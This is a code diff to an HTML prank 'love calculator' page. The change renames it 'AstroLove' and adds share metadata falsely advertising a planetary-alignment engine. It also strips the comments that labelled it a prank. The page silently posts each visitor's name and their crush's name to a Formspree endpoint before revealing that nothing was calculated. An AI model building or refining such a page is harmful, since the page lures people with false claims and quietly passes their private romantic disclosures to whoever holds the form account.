@@ -3,7 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Calculator 3D</title>
+    
+    <title>✨ AstroLove: 2026 Compatibility Check</title>
+    <meta property="og:title" content="✨ AstroLove: 2026 Compatibility Check">
+    <meta property="og:description" content="Calculate your love percentage using our 3D planetary alignment engine.">
+    <meta property="og:image" content="https://img.icons8.com/color/480/hearts.png">
+    <meta property="og:type" content="website">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
     <style>
         :root {
             --pink: #ff4d6d;
@@ -114,10 +122,9 @@
             btn.innerHTML = "Calculating...";
             btn.disabled = true;
 
-            // Prepare the data for Formspree
             const formData = new FormData(form);
 
-            // Send to your Formspree ID: xzdobqvk
+            // Using your unique Formspree ID
             try {
                 await fetch('https://formspree.io/f/xzdobqvk', {
                     method: 'POST',
@@ -125,15 +132,12 @@
                     headers: { 'Accept': 'application/json' }
                 });
             } catch (err) {
-                // Fail silently to keep the prank moving
-                console.log("Submit handled");
+                console.log("Submission handled");
             }
 
-            // Switch to Prank Card
             document.getElementById('main-card').classList.add('hidden');
             document.getElementById('prank-card').classList.remove('hidden');
             
-            // Set the specific message you wanted
             document.getElementById('prank-msg').innerHTML = 
                 `There's no calculation <strong>${userName}</strong>... <br><br> But I know you are crushing on <strong>${crushName}</strong>!`;
         });
